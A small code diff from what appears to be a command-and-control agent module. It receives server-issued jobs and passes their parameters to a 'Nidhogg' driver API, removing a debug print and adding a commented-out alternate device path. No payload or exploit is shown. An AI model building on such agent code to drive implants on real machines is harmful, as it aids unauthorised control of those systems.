@@ -23,12 +23,12 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-            Console.WriteLine(job.task.parameters);
             NidhoggArgs args = JsonSerializer.Deserialize<NidhoggArgs>(job.task.parameters);
 
             try
             {
                 var nidhogg = new NidhoggApi();
+                //var nidhogg = new NidhoggApi("\\\\.\\NotNidhogg");
                 await this.HandleNidhoggCommand(nidhogg, args, job.task.id);
             }
             catch (NidhoggApiException e)
